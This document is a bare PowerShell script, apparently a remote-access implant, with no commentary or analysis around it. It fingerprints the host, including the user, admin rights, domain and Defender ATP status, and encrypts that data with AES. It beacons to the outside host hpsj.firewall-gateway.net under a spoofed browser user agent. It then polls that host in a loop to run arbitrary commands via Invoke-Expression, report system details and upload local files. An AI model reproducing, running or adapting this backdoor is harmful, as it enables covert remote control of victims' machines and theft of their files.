$ZZRTFI = 5;
$NVQLQTW = "S0lPUFNEQ1lPQklFQktIS0RCQ1dNTFhNS0JRQldPVE4=";
$ATCET = "WlFBSkxLWUtCRUhKTUJKWg=="

function EBR($NVQLQTW, $ATCET) {
    $XAER = New-Object "System.Security.Cryptography.AesManaged"
    $XAER.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $XAER.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $XAER.BlockSize = 128
    $XAER.KeySize = 256
    if ($ATCET) {
        if ($ATCET.getType().Name -eq "String") {
            $XAER.IV = [System.Convert]::FromBase64String($ATCET)
        }
        else {
            $XAER.IV = $ATCET
        }
    }
    if ($NVQLQTW) {
        if ($NVQLQTW.getType().Name -eq "String") {
            $XAER.Key = [System.Convert]::FromBase64String($NVQLQTW)
        }
        else {
            $XAER.Key = $NVQLQTW
        }
    }
    $XAER
}

function HUVZDQBS($NVQLQTW, $ATCET, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $XAER = EBR $NVQLQTW $ATCET
    $DY = $XAER.CreateEncryptor()
    $encryptedData = $DY.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Convert]::ToBase64String($encryptedData)
}

function TXTXSH($NVQLQTW, $ATCET, $cipher) {
    $bytes = [System.Convert]::FromBase64String($cipher)
    $XAER = EBR $NVQLQTW $ATCET
    $decryptor = $XAER.CreateDecryptor();
    $HTZFKIUR = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Text.Encoding]::UTF8.GetString($HTZFKIUR).Trim([char]0)
}


$progressPreference = 'silentlyContinue';
$wc = New-Object system.Net.WebClient;
$wc2 = New-Object system.Net.WebClient;
$wcr = New-Object system.Net.WebClient;
$hostname = $env:COMPUTERNAME;
$FO = HUVZDQBS $NVQLQTW $ATCET $hostname
$OXV = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$r2 = $OXV;
$IVXMIB = "$hostname-$r2";
$ECOBKOM = $env:USERNAME;
$whmenc = HUVZDQBS $NVQLQTW $ATCET $ECOBKOM
$SJDGR = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$CRMOKFLYE = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($SJDGR)";
$VUJCCDBAQ = (Get-WmiObject Win32_ComputerSystem).Domain;


$procarch = [Environment]::Is64BitProcess
$procarchf = ""
if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"}

$pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf"

$user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
$iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

if($iselv){
$ECOBKOM = $ECOBKOM + "*"
}

$random = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status" -Name OnboardingState -ErrorAction SilentlyContinue).OnboardingState;if($random -eq $null){$atp = $false}else{$atp = $true}
$raw_header = "$IVXMIB,$ECOBKOM,$CRMOKFLYE,$pnid,$VUJCCDBAQ,$atp";
$encrypted_header = HUVZDQBS $NVQLQTW $ATCET $raw_header;
$final_hostname_encrypted = HUVZDQBS $NVQLQTW $ATCET $IVXMIB

$wch = $wc.headers;
$wch.add("Authorization", $encrypted_header);
$wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");

$wc.downloadString("http://hpsj.firewall-gateway.net:80/login");
$failure_counter = 0;
while($true){

    try{
    $command_raw = $wc2.downloadString("http://hpsj.firewall-gateway.net:80/view/$IVXMIB");
    }catch{
    $failure_counter=$failure_counter +1;
    if ($failure_counter -eq 10){
    kill $pid
    }
    }

    $final_command = TXTXSH $NVQLQTW $ATCET $command_raw
    $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)

    if($fc -eq "False"){

    } elseif($fc -eq "Report"){
      $ps = foreach ($i in Get-Process){$i.ProcessName};
      $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
      $ps+= $arr -join ";"
      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
      $ps+= (Get-WinSystemLocale).Name
      $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
      $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
      $pst = HUVZDQBS $NVQLQTW $ATCET $ps
      $wcrh = $wcr.Headers;
      $wcrh.add("Authorization", $pst);
      $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
      $wcrh.add("App-Logic", $FO);
      $wcr.downloadString("http://hpsj.firewall-gateway.net:80/calls");
    } elseif($fc.split(" ")[0] -eq "Download"){
        $filename = HUVZDQBS $NVQLQTW $ATCET $fc.split("\")[-1]
        $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1])
        $ZN = [Convert]::ToBase64String($file_content);
        $efc = HUVZDQBS $NVQLQTW $ATCET $ZN;
        $UINCJGOU = new-object net.WebClient;
        $XNHOV = $UINCJGOU.Headers;
        $XNHOV.add("Content-Type", "application/x-www-form-urlencoded");
        $XNHOV.add("x-Authorization", $whmenc);
        $UINCJGOU.UploadString("http://hpsj.firewall-gateway.net:80/messages", "fn=$filename&token=$efc");
    } elseif($fc -eq "reset-ps"){
        try{
        # Reset Powershell session (clean)
        # NOT IMPLEMENTED YET
        $ec = "NO";
        }
        catch{
        $ec = $Error[0] | Out-String;
        }

        $ZN = HUVZDQBS $NVQLQTW $ATCET $ec;
        $UINCJGOU = New-Object system.Net.WebClient;
        $UINCJGOU.Headers["App-Logic"] = $final_hostname_encrypted;
        $UINCJGOU.Headers["Authorization"] = $ZN;
        $UINCJGOU.Headers["Session"] = $command_raw;
        $UINCJGOU.downloadString("http://hpsj.firewall-gateway.net:80/bills");
    } else{
      try{
        $ec = Invoke-Expression ($fc) | Out-String;
        }
        catch{
        $ec = $Error[0] | Out-String;
        }
        $ZN = HUVZDQBS $NVQLQTW $ATCET $ec;
        $UINCJGOU = New-Object system.Net.WebClient;
        $UINCJGOU.Headers["App-Logic"] = $final_hostname_encrypted;
        $UINCJGOU.Headers["Authorization"] = $ZN;
        $UINCJGOU.Headers["Session"] = $command_raw;
        $UINCJGOU.downloadString("http://hpsj.firewall-gateway.net:80/bills");
    }

    sleep $ZZRTFI;
    }
